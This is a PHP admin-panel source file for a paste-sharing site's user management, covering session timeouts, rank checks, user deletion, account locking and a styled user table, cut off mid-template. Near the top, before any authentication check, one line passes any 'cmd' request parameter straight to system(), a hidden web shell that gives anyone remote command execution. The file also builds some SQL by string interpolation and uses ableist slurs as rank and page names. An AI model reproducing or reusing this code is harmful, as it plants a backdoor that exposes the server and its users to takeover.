<?php
session_start();
include('../database.php');
include_once(__DIR__ . '/admin_2fa_gate.php');

$timeout = 900;
if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > $timeout)) {
    session_unset();
    session_destroy();
    header('Location: /login');
    exit();
}
$_SESSION['LAST_ACTIVITY'] = time();

if (!isset($_SESSION['CREATED'])) {
    $_SESSION['CREATED'] = time();
} elseif (time() - $_SESSION['CREATED'] > 1800) {
    session_regenerate_id(true);
    $_SESSION['CREATED'] = time();
}

if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }
if (!isset($_SESSION['username']) && isset($_COOKIE['login_token'])) {
    $login_token = preg_replace('/[^a-f0-9]/', '', $_COOKIE['login_token']);
    if ($login_token) {
        $stmt = $conn->prepare("SELECT username, login_token, rank, locked FROM users WHERE login_token = ?");
        $stmt->bind_param("s", $login_token);
        $stmt->execute();
        $result = $stmt->get_result();
        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            if (!empty($row['login_token'])) {
                // Check if account is locked
                if ($row['locked'] == 1) {
                    session_destroy();
                    setcookie('login_token', '', time() - 3600, "/", "", true, true);
                    header('Location: /login');
                    exit();
                }
                
                $_SESSION['username'] = $row['username'];
                $_SESSION['CREATED'] = time();
                $_SESSION['LAST_ACTIVITY'] = time();
                $_SESSION['rank'] = $row['rank'];
            }
        }
        $stmt->close();
    }
}

$username = $_SESSION['username'] ?? null;
if ($username) {
    $stmt = $conn->prepare("SELECT login_token, rank FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        if (empty($row['login_token'])) {
            session_destroy();
            header('Location: /login');
            exit();
        }
        $loggedInUserRank = $row['rank'] ?? 'All Users';
    } else {
        session_destroy();
        header('Location: /login');
        exit();
    }
    $stmt->close();
} else {
    header('Location: /login');
    exit();
}

$requiredRanks = ['Admin', 'Manager', 'Mod', 'Council', 'Founder'];
if (!in_array($loggedInUserRank, $requiredRanks)) {
    header('Location: /login');
    exit();
}

$validRanks = [];
$ranksResult = $conn->query("SELECT rank_name FROM rank ORDER BY rank_id ASC");
if ($ranksResult) {
    while ($row = $ranksResult->fetch_assoc()) {
        $validRanks[] = $row['rank_name'];
    }
    if (!in_array('All Users', $validRanks, true)) {
        $validRanks[] = 'All Users';
    }
} else {
    $validRanks = ['Admin', 'Manager', 'Mod', 'Council', 'Clique', 'Founder', 'Shield','Kte','Rich', 'Criminal', 'Vip', 'Retards', 'All Users'];
}

$activeSection = isset($_GET['section']) ? $_GET['section'] : 'users';
$validSections = ['users'];
if (!in_array($activeSection, $validSections)) {
    $activeSection = 'users';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    function getUserRank($conn, $username) {
        $stmt = $conn->prepare("SELECT rank FROM users WHERE username = ?");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $result = $stmt->get_result();
        $row = $result->fetch_assoc();
        $stmt->close();
        return $row ? $row['rank'] : null;
    }

    function canManage($actingRank, $targetRank, $actingUsername, $targetUsername) {
        if ($actingUsername === $targetUsername) return false; 
        $hierarchy = [
            'Admin' => 4,
            'Founder' => 4,
            'Manager' => 3,
            'Mod' => 2,
            'Council' => 1,
            'Clique' => 0,
            'Shield' => 0,
            'Kte' => 0,
            'Rich' => 0,
            'Criminal' => 0,
            'Vip' => 0,
            'Retards' => 0,
            'All Users' => -1,
            null => -1
        ];
        $actingLevel = $hierarchy[$actingRank] ?? -1;
        $targetLevel = $hierarchy[$targetRank] ?? -1;
        return $actingLevel > $targetLevel;
    }

    if (isset($_POST['username']) && isset($_POST['new_rank'])) {
        $targetUsername = $_POST['username'];
        $newRank = $_POST['new_rank'] === 'All Users' ? NULL : $_POST['new_rank'];

        if ($newRank !== NULL && !in_array($newRank, $validRanks)) {
            echo json_encode(['error' => 'Invalid rank']);
            exit();
        }

        $targetRank = getUserRank($conn, $targetUsername);

        if (!canManage($loggedInUserRank, $targetRank, $username, $targetUsername)) {
            echo json_encode(['error' => 'Unauthorized']);
            exit();
        }

        if ($loggedInUserRank === 'Manager' && ($newRank === 'Admin' || $newRank === 'Founder')) {
            echo json_encode(['error' => 'Unauthorized']);
            exit();
        }

        $updateQuery = "UPDATE users SET rank = ? WHERE username = ?";
        $updateStmt = $conn->prepare($updateQuery);
        $updateStmt->bind_param("ss", $newRank, $targetUsername);

        if ($updateStmt->execute()) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'Failed to update rank']);
        }
        exit();
    }

    if (isset($_POST['delete_username'])) {
        $usernameToDelete = $_POST['delete_username'];
        $targetRank = getUserRank($conn, $usernameToDelete);

        if (!canManage($loggedInUserRank, $targetRank, $username, $usernameToDelete)) {
            echo json_encode(['success' => false, 'error' => 'Unauthorized.']);
            exit;
        }

        $stmt = $conn->prepare("SELECT rank FROM users WHERE username = ?");
        $stmt->bind_param("s", $usernameToDelete);
        $stmt->execute();
        $userToDelete = $stmt->get_result()->fetch_assoc();

        if (!$userToDelete) {
            echo json_encode(['success' => false, 'error' => 'User not found.']);
            exit;
        }

        $rankToDelete = $userToDelete['rank'];

        if ($loggedInUserRank === 'Manager' && in_array($rankToDelete, ['Admin', 'Manager', 'Founder'])) {
            echo json_encode(['success' => false, 'error' => 'Managers cannot delete Admins, Founders, or other Managers.']);
            exit;
        }

        try {
            $conn->begin_transaction();
        
            $deletePasteViewsStmt = $conn->prepare("DELETE FROM paste_views WHERE paste_id IN (SELECT id FROM pastes WHERE creator = ?)");
            $deletePasteViewsStmt->bind_param("s", $usernameToDelete);
            if (!$deletePasteViewsStmt->execute()) {
                throw new Exception('Failed to delete paste views.');
            }
        
            $deletePastesStmt = $conn->prepare("DELETE FROM pastes WHERE creator = ?");
            $deletePastesStmt->bind_param("s", $usernameToDelete);
            if (!$deletePastesStmt->execute()) {
                throw new Exception('Failed to delete pastes.');
            }
        
            $deleteCommentsStmt = $conn->prepare("DELETE FROM profile_comments WHERE commenter_username = ?");
            $deleteCommentsStmt->bind_param("s", $usernameToDelete);
            if (!$deleteCommentsStmt->execute()) {
                throw new Exception('Failed to delete comments.');
            }
        
            $deleteUserStmt = $conn->prepare("DELETE FROM users WHERE username = ?");
            $deleteUserStmt->bind_param("s", $usernameToDelete);
            if (!$deleteUserStmt->execute()) {
                throw new Exception('Failed to delete user.');
            }
        
            $getPfpStmt = $conn->prepare("SELECT profile_picture FROM users WHERE username = ?");
            $getPfpStmt->bind_param("s", $usernameToDelete);
            $getPfpStmt->execute();
            $user = $getPfpStmt->get_result()->fetch_assoc();
        
            if ($user && !empty($user['profile_picture'])) {
                $profilePicturePath = $user['profile_picture'];
                if (file_exists($profilePicturePath) && !unlink($profilePicturePath)) {
                    throw new Exception('Failed to delete profile picture.');
                }
            }
        
            $conn->commit();
            echo json_encode(['success' => true]);
        } catch (Exception $e) {
            $conn->rollback();
            echo json_encode(['success' => false, 'error' => 'Error deleting user and related data: ' . $e->getMessage()]);
        }
        exit;
    }

    $input = json_decode(file_get_contents('php://input'), true);
    if ($input && isset($input['username'])) {
        $targetUsername = $conn->real_escape_string($input['username']);
        $targetRank = getUserRank($conn, $targetUsername);

        if (!canManage($loggedInUserRank, $targetRank, $username, $targetUsername)) {
            echo json_encode(['success' => false, 'error' => 'Unauthorized.']);
            exit;
        }

        $query = "SELECT * FROM users WHERE username = '$targetUsername'";
        $result = $conn->query($query);

        if ($result->num_rows === 0) {
            echo json_encode(['success' => false, 'error' => 'User not found.']);
            exit;
        }

        $user = $result->fetch_assoc();
        $newLockedValue = $user['locked'] == 1 ? 0 : 1;  
        $updateQuery = "UPDATE users SET locked = $newLockedValue WHERE username = '$targetUsername'";

        if ($conn->query($updateQuery)) {
            // If locking the account, clear the login token to force re-authentication
            if ($newLockedValue === 1) {
                $clearTokenQuery = "UPDATE users SET login_token = NULL WHERE username = '$targetUsername'";
                $conn->query($clearTokenQuery);
            }
            
            if ($_SESSION['username'] === $targetUsername && $newLockedValue === 1) {
                session_destroy();
            }

            echo json_encode([
                'success' => true,
                'message' => $newLockedValue === 1 ? "The account for $targetUsername has been locked." : "The account for $targetUsername has been unlocked."
            ]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Failed to update the account status.']);
        }
        exit;
    }
}

$itemsPerPage = 50; 
$page = isset($_GET['page']) && is_numeric($_GET['page']) ? (int)$_GET['page'] : 1;
$page = max($page, 1);
$offset = ($page - 1) * $itemsPerPage;

$search_query = isset($_GET['search']) ? htmlspecialchars(trim($_GET['search']), ENT_QUOTES, 'UTF-8') : '';

if ($search_query !== '') {
    $search_query_for_sql = "%$search_query%";
    $totalUsersQuery = "SELECT COUNT(*) as total FROM users WHERE username LIKE ?";
    $stmt = $conn->prepare($totalUsersQuery);
    $stmt->bind_param("s", $search_query_for_sql);
    $stmt->execute();
    $totalUsersResult = $stmt->get_result();
    $totalItems = $totalUsersResult->fetch_assoc()['total'];

    $sql = "SELECT username, rank, locked, email FROM users WHERE username LIKE ? LIMIT ? OFFSET ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("sii", $search_query_for_sql, $itemsPerPage, $offset);
} else {
    $totalUsersQuery = "SELECT COUNT(*) as total FROM users";
    $totalUsersResult = $conn->query($totalUsersQuery);
    $totalItems = $totalUsersResult->fetch_assoc()['total'];

    $sql = "SELECT username, rank, locked, email FROM users LIMIT ? OFFSET ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ii", $itemsPerPage, $offset);
}

$stmt->execute();
$items = $stmt->get_result();
$totalPages = ceil($totalItems / $itemsPerPage);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Admin Panel - User Management</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --black: #000000;
            --dark-gray-1: #121212;
            --dark-gray-2: #1E1E1E;
            --dark-gray-3: #252525;
            --gray-1: #333333;
            --gray-2: #555555;
            --gray-3: #777777;
            --light-gray-1: #AAAAAA;
            --light-gray-2: #CCCCCC;
            --light-gray-3: #EEEEEE;
            --white: #FFFFFF;
            
            --primary: #8B5CF6;
            --primary-hover: #7C3AED;
            --primary-glow: rgba(139, 92, 246, 0.3);
            --secondary: #6B7280;
            --secondary-hover: #4B5563;
            --success: #10B981;
            --success-hover: #059669;
            --danger: #EF4444;
            --danger-hover: #DC2626;
            --warning: #F59E0B;
            --warning-hover: #D97706;
            --info: #3B82F6;
            --info-hover: #2563EB;
            
            --bg-dark: #0F0F1A;
            --bg-card: #1A1A2E;
            --bg-nav: #0F0F1A;
            --text-light: #FFFFFF;
            --text-medium: #D1D5DB;
            --text-muted: #9CA3AF;
            --border: #2D2D4D;
            --border-light: #3E3E5E;
            
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.3);
            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.4);
            --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.5);
            --glow-sm: 0 0 10px var(--primary-glow);
            --glow-md: 0 0 20px var(--primary-glow);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            color: var(--text-light);
            background: var(--bg-dark);
            font-family: 'Inter', sans-serif;
            line-height: 1.6;
            overflow-x: hidden;
            opacity: 0;
            animation: fadeIn 0.6s ease-out forwards;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(139, 92, 246, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(139, 92, 246, 0.1) 0%, transparent 20%);
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .navbar {
            background: var(--bg-nav);
            box-shadow: var(--shadow-sm), var(--glow-sm);
            padding: 0.75rem 1rem;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1030;
            display: flex;
            align-items: center;
            height: 70px;
            border-bottom: 1px solid var(--border-light);
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--white);
            display: flex;
            align-items: center;
            gap: 0.75rem;
            text-shadow: 0 0 10px var(--primary-glow);
        }

        .navbar-brand i {
            font-size: 1.75rem;
            color: var(--primary);
        }

        .nav-tabs {
            margin-left: 2rem;
            border: none;
            gap: 0.5rem;
        }

        .nav-tabs .nav-link {
            border: none;
            padding: 0.75rem 1.25rem;
            font-weight: 500;
            color: var(--text-muted);
            border-radius: 0.5rem;
            position: relative;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .nav-tabs .nav-link:hover {
            color: var(--white);
            background: rgba(139, 92, 246, 0.1);
            transform: translateY(-2px);
        }

        .nav-tabs .nav-link.active {
            color: var(--white);
            background: rgba(139, 92, 246, 0.2);
            box-shadow: var(--glow-sm);
            font-weight: 600;
        }

        .nav-tabs .nav-link.active::after {
            display: none;
        }

        .navbar-actions {
            margin-left: auto;
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .main-content {
            margin-top: 70px;
            padding: 2rem;
            min-height: calc(100vh - 70px);
        }

        .page-header {
            margin-bottom: 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .page-title {
            font-size: 1.75rem;
            font-weight: 700;
            margin: 0;
            color: var(--white);
            text-shadow: 0 0 10px var(--primary-glow);
        }

        .card {
            background: var(--bg-card);
            border-radius: 0.75rem;
            border: 1px solid var(--border);
            box-shadow: var(--shadow-md);
            margin-bottom: 1.5rem;
            transition: all 0.3s ease;
            overflow: hidden;
        }

        .card:hover {
            box-shadow: var(--shadow-lg), var(--glow-sm);
            transform: translateY(-5px);
        }

        .card-header {
            background: var(--bg-card);
            border-bottom: 1px solid var(--border);
            padding: 1.25rem 1.5rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .card-title {
            font-weight: 600;
            margin: 0;
            font-size: 1.25rem;
            color: var(--white);
        }

        .card-body {
            padding: 1.5rem;
        }

        .form-control {
            padding: 0.75rem 1rem;
            border: 1px solid var(--border);
            border-radius: 0.5rem;
            transition: all 0.3s ease;
            background-color: var(--dark-gray-3);
            color: var(--white);
            font-size: 0.95rem;
        }

        .form-control:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px var(--primary-glow);
            outline: none;
        }

        .form-control::placeholder {
            color: var(--text-muted);
        }

        .search-container {
            max-width: 100%;
            margin-bottom: 1.5rem;
            position: relative;
        }

        .search-container i {
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            z-index: 5;
        }

        .search-container input {
            padding-left: 3rem;
            width: 100%;
            border-radius: 0.75rem;
        }

        .table {
            margin-bottom: 0;
            color: var(--text-medium);
            border-collapse: separate;
            border-spacing: 0;
        }

        .table th {
            background-color: rgba(139, 92, 246, 0.1);
            font-weight: 600;
            font-size: 0.875rem;
            text-transform: uppercase;
            letter-spacing: 0.025rem;
            border-top: none;
            padding: 1rem 1.25rem;
            color: var(--white);
            border-bottom: 1px solid var(--border);
        }

        .table td {
            vertical-align: middle;
            padding: 1rem 1.25rem;
            border-color: var(--border);
            background-color: var(--bg-card);
            color: var(--text-light);
            border-bottom: 1px solid var(--border);
        }

        .table td a, 
        .table td span:not(.badge),
        .table td p {
            color: var(--text-light);
        }

        .username-text,
        .creator-text,
        .title-text {
            color: var(--text-light);
            font-weight: 500;
        }

        .table-hover tbody tr:hover {
            background-color: rgba(139, 92, 246, 0.05);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .badge {
            padding: 0.5rem 0.75rem;
            font-size: 0.75rem;
            font-weight: 600;
            border-radius: 0.5rem;
        }

        .badge-success {
            background-color: rgba(16, 185, 129, 0.2);
            color: var(--success);
            border: 1px solid rgba(16, 185, 129, 0.3);
        }

        .badge-secondary {
            background-color: rgba(107, 114, 128, 0.2);
            color: var(--secondary);
            border: 1px solid rgba(107, 114, 128, 0.3);
        }

        .badge-danger {
            background-color: rgba(239, 68, 68, 0.2);
            color: var(--danger);
            border: 1px solid rgba(239, 68, 68, 0.3);
        }

        .btn {
            padding: 0.75rem 1.25rem;
            font-weight: 500;
            border-radius: 0.5rem;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            border: none;
            font-size: 0.9rem;
        }

        .btn-sm {
            padding: 0.5rem 0.75rem;
            font-size: 0.875rem;
        }

        .btn-primary {
            background-color: var(--primary);
            color: var(--white);
        }

        .btn-primary:hover {
            background-color: var(--primary-hover);
            box-shadow: var(--glow-sm);
            transform: translateY(-2px);
        }

        .btn-outline-primary {
            color: var(--primary);
            border: 1px solid var(--primary);
            background: transparent;
        }

        .btn-outline-primary:hover {
            background-color: var(--primary);
            border-color: var(--primary);
            color: var(--white);
            box-shadow: var(--glow-sm);
            transform: translateY(-2px);
        }

        .btn-outline-success {
            color: var(--success);
            border: 1px solid var(--success);
            background: transparent;
        }

        .btn-outline-success:hover {
            background-color: var(--success);
            border-color: var(--success);
            color: var(--white);
            transform: translateY(-2px);
        }

        .btn-outline-danger {
            color: var(--danger);
            border: 1px solid var(--danger);
            background: transparent;
        }

        .btn-outline-danger:hover {
            background-color: var(--danger);
            border-color: var(--danger);
            color: var(--white);
            transform: translateY(-2px);
        }

        .btn-outline-warning {
            color: var(--warning);
            border: 1px solid var(--warning);
            background: transparent;
        }

        .btn-outline-warning:hover {
            background-color: var(--warning);
            border-color: var(--warning);
            color: var(--white);
            transform: translateY(-2px);
        }

        .btn-outline-info {
            color: var(--info);
            border: 1px solid var(--info);
            background: transparent;
        }

        .btn-outline-info:hover {
            background-color: var(--info);
            border-color: var(--info);
            color: var(--white);
            transform: translateY(-2px);
        }

        .action-buttons {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .pagination {
            justify-content: center;
            margin: 2rem 0 0;
            gap: 0.5rem;
        }

        .page-link {
            color: var(--text-medium);
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            padding: 0.75rem 1rem;
            font-size: 0.9rem;
            border-radius: 0.5rem;
            transition: all 0.3s ease;
        }

        .page-link:hover {
            background-color: var(--primary);
            border-color: var(--primary);
            color: var(--white);
            z-index: 2;
            transform: translateY(-2px);
        }

        .page-link:focus {
            box-shadow: 0 0 0 3px var(--primary-glow);
        }

        .page-item.active .page-link {
            background-color: var(--primary);
            border-color: var(--primary);
            color: var(--white);
            box-shadow: var(--glow-sm);
        }

        .modal-content {
            background: var(--bg-card);
            border-radius: 0.75rem;
            border: 1px solid var(--border);
            box-shadow: var(--shadow-lg), var(--glow-md);
            color: var(--white);
        }

        .modal-header {
            border-bottom: 1px solid var(--border);
            padding: 1.5rem;
        }

        .modal-title {
            color: var(--white);
            font-weight: 600;
        }

        .modal-body {
            padding: 1.5rem;
        }

        .btn-close {
            filter: invert(1) grayscale(100%) brightness(200%);
        }

        .list-group-item {
            background-color: var(--dark-gray-3);
            color: var(--text-medium);
            border-color: var(--border);
            padding: 0.75rem 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            border-radius: 0.5rem;
            margin-bottom: 0.5rem;
        }

        .list-group-item:hover {
            background-color: rgba(139, 92, 246, 0.1);
            color: var(--white);
            transform: translateX(5px);
        }

        .list-group-item.selected {
            background-color: var(--primary);
            color: var(--white);
            border-color: var(--primary);
            box-shadow: var(--glow-sm);
        }

        .modal-custom {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1050;
            display: none;
            background: var(--bg-card);
            border-radius: 0.75rem;
            width: 90%;
            max-width: 500px;
            padding: 1.5rem;
            box-shadow: var(--shadow-lg), var(--glow-md);
            border: 1px solid var(--border);
        }

        .modal-custom-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 1rem;
            border-bottom: 1px solid var(--border);
            margin-bottom: 1.5rem;
        }

        .modal-custom-title {
            font-size: 1.25rem;
            font-weight: 600;
            color: var(--white);
            margin: 0;
        }

        .modal-custom-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 1.5rem;
            cursor: pointer;
            line-height: 1;
            transition: color 0.3s ease;
        }

        .modal-custom-close:hover {
            color: var(--danger);
        }

        .modal-custom .btn {
            padding: 0.75rem 1.25rem;
            font-weight: 500;
            border-radius: 0.5rem;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
        }

        #modalOverlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(15, 15, 26, 0.8);
            z-index: 1040;
            display: none;
            backdrop-filter: blur(5px);
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--white);
        }

        .user-item {
            animation: fadeInUp 0.3s ease-out forwards;
            opacity: 0;
            transform: translateY(8px);
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(8px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .rank-badge {
            display: inline-block;
            padding: 0.5rem 0.75rem;
            border-radius: 0.5rem;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.025rem;
            background-color: rgba(139, 92, 246, 0.2);
            color: var(--primary);
            border: 1px solid rgba(139, 92, 246, 0.3);
        }

        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }

        .stat-card {
            background: var(--bg-card);
            border-radius: 0.75rem;
            padding: 1.5rem;
            text-align: center;
            box-shadow: var(--shadow-md);
            border: 1px solid var(--border);
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: var(--shadow-lg), var(--glow-sm);
        }

        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            color: var(--primary);
            margin-bottom: 0.5rem;
        }

        .stat-label {
            font-size: 0.9rem;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.05rem;
        }

        .no-results {
            text-align: center;
            padding: 3rem 1rem;
            color: var(--text-muted);
        }

        .no-results i {
            font-size: 3rem;
            margin-bottom: 1rem;
            color: var(--primary);
        }

        @media (max-width: 992px) {
            .navbar-expand-lg .navbar-nav {
                flex-direction: row;
            }
            
            .navbar {
                flex-wrap: wrap;
                height: auto;
                padding: 1rem;
            }
            
            .nav-tabs {
                margin-left: 0;
                margin-top: 1rem;
                flex-wrap: nowrap;
                overflow-x: auto;
                width: 100%;
                padding-bottom: 0.5rem;
            }
            
            .main-content {
                margin-top: 120px;
                padding: 1rem;
            }
            
            .action-buttons {
                flex-direction: column;
            }
            
            .action-buttons .btn {
                width: 100%;
                justify-content: center;
            }
        }

        @media (max-width: 768px) {
            .page-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 1rem;
            }
            
            .stats-container {
                grid-template-columns: 1fr;
            }
            
            .table-responsive {
                border-radius: 0.5rem;
                overflow: hidden;
            }
        }

        .glow-text {
            text-shadow: 0 0 10px var(--primary-glow);
        }

        .glow-border {
            box-shadow: 0 0 15px var(--primary-glow);
        }
    </style>
</head>
<body>
<nav class="navbar navbar-expand-lg">
    <div class="container-fluid">
        <a class="navbar-brand" href="#">
            <i class="fas fa-shield-alt"></i>
            Admin Panel
        </a>
        <ul class="nav nav-tabs">
            <li class="nav-item">
                <a class="nav-link active" href="index.php">
                    <i class="fas fa-users"></i> Users
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="pastes.php">
                    <i class="fas fa-file-code"></i> Pastes
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="delete_logs.php">
                    <i class="fas fa-history"></i> Delete Logs
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="badges.php">
                    <i class="fas fa-award"></i> Badges
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="links.php">
                    <i class="fas fa-link"></i> Links
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="hoa.php">
                    <i class="fas fa-crown"></i> Hall of Autism
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="edits.php">
                    <i class="fas fa-edit"></i> Edits
                </a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="dashboard.php">
                    <i class="fas fa-tachometer-alt"></i> Dashboard
                </a>
            </li>
        </ul>
        <div class="navbar-actions">
            <a href="../home" class="btn btn-outline-primary btn-sm">
                <i class="fas fa-home"></i> Home
            </a>
        </div>
    </div>
</nav>
<div class="main-content">
    <div class="container-fluid">
        <div class="page-header">
            <h1 class="page-title">User Management</h1>
            <div class="d-flex gap-2">
                <button class="btn btn-primary" id="exportUsers">
                    <i class="fas fa-download"></i> Export Users
                </button>
                <button class="btn btn-outline-info" id="refreshData">
                    <i class="fas fa-sync-alt"></i> Refresh
                </button>
            </div>
        </div>

        <div class="stats-container">
            <div class="stat-card">
                <div class="stat-value"><?= $totalItems ?></div>
                <div class="stat-label">Total Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-value"><?= $itemsPerPage ?></div>
                <div class="stat-label">Users Per Page</div>
            </div>
            <div class="stat-card">
                <div class="stat-value"><?= $page ?></div>
                <div class="stat-label">Current Page</div>
            </div>
            <div class="stat-card">
                <div class="stat-value"><?= $totalPages ?></div>
                <div class="stat-label">Total Pages</div>
            </div>
        </div>

        <div class="card">
            <div class="card-header">
                <h5 class="card-title">User List</h5>
                <div class="d-flex align-items-center gap-2">
                    <span class="text-muted">Showing <?= $itemsPerPage ?> of <?= $totalItems ?> users</span>
                </div>
            </div>
            <div class="card-body">
                <div class="search-container">
                    <i class="fas fa-search"></i>
                    <input type="text" id="search-input" class="form-control" placeholder="Search for users..." value="<?php echo htmlspecialchars($search_query); ?>">
                </div>
                
                <div class="table-responsive">
                    <table class="table table-hover">
                        <thead>
                            <tr>
                                <th>Username</th>
                                <th>Email</th> 
                                <th>Rank</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="users-table">
                            <?php $delay = 0; while ($user = $items->fetch_assoc()): $delay += 0.03; ?>
                                <tr class="user-item" style="animation-delay: <?= $delay ?>s">
                                    <td>
                                        <div class="d-flex align-items-center">
                                            <div class="rounded-circle bg-primary d-flex align-items-center justify-content-center me-2" style="width: 36px; height: 36px;">
                                                <span class="text-white fw-bold"><?= strtoupper(substr($user['username'] ?? '', 0, 1)) ?></span>
                                            </div>
                                            <span class="username-text"><?= htmlspecialchars($user['username'] ?? '', ENT_QUOTES, 'UTF-8') ?></span>
                                        </div>
                                    </td>
                                    <td>
                                        <?php if (!empty($user['email'])): ?>
                                            <span><?= htmlspecialchars($user['email'], ENT_QUOTES, 'UTF-8') ?></span>
                                        <?php else: ?>
                                            <span class="text-muted">-</span>
                                        <?php endif; ?>
                                    </td>
                                    <td>
                                        <span class="rank-badge">
                                            <?= htmlspecialchars($user['rank'] ?? 'All Users', ENT_QUOTES, 'UTF-8') ?>
                                        </span>
                                    </td>
                                    <td>
                                        <span class="badge <?= $user['locked'] ? 'badge-danger' : 'badge-success' ?>">
                                            <i class="fas <?= $user['locked'] ? 'fa-lock' : 'fa-unlock' ?> me-1"></i>
                                            <?= $user['locked'] ? 'Locked' : 'Active' ?>
                                        </span>
                                    </td>
                                    <td>
                                        <div class="action-buttons">
                                            <?php if (in_array($loggedInUserRank, ['Admin', 'Manager', 'Founder'])): ?>
                                                <button class="btn btn-outline-primary btn-sm rank-btn" data-username="<?= htmlspecialchars($user['username'] ?? '', ENT_QUOTES, 'UTF-8') ?>" title="Change Rank">
                                                    <i class="fas fa-user-tag"></i>
                                                </button>
                                            <?php endif; ?>

                                            <?php if (in_array($loggedInUserRank, ['Admin', 'Founder'])): ?>
                                                <button class="btn btn-outline-danger btn-sm delete-user-btn" data-username="<?= htmlspecialchars($user['username'] ?? '', ENT_QUOTES, 'UTF-8') ?>" title="Delete User">
                                                    <i class="fas fa-trash-alt"></i>
                                                </button>
                                            <?php endif; ?>

                                            <?php if (in_array($loggedInUserRank, ['Admin', 'Manager', 'Founder'])): ?>
                                                <button class="btn btn-outline-warning btn-sm change-pass-btn" data-username="<?= htmlspecialchars($user['username'] ?? '', ENT_QUOTES, 'UTF-8') ?>" title="Change Password">
                                                    <i class="fas fa-key"></i>
                                                </button>
                                                <button class="btn btn-outline-info btn-sm change-username-btn" data-username="<?= htmlspecialchars($user['username'] ?? '', ENT_QUOTES, 'UTF-8') ?>" title="Change Username">
                                                    <i class="fas fa-pen"></i>
                                                </button>
                                            <?php endif; ?>

                                            <?php if (in_array($loggedInUserRank, ['Admin', 'Manager', 'Founder']) && 
                                                      $user['username'] !== $username &&
                                                      $user['rank'] !== $loggedInUserRank): ?>
                                                <button class="btn <?= $user['locked'] ? 'btn-outline-success' : 'btn-outline-danger' ?> btn-sm lock-btn" data-username="<?= htmlspecialchars($user['username'] ?? '', ENT_QUOTES, 'UTF-8') ?>" title="<?= $user['locked'] ? 'Unlock Account' : 'Lock Account' ?>">
                                                    <i class="fas <?= $user['locked'] ? 'fa-unlock' : 'fa-lock' ?>"></i>
                                                </button>
                                            <?php endif; ?>
                                            <?php if (in_array($loggedInUserRank, ['Admin', 'Manager', 'Founder'])): ?>
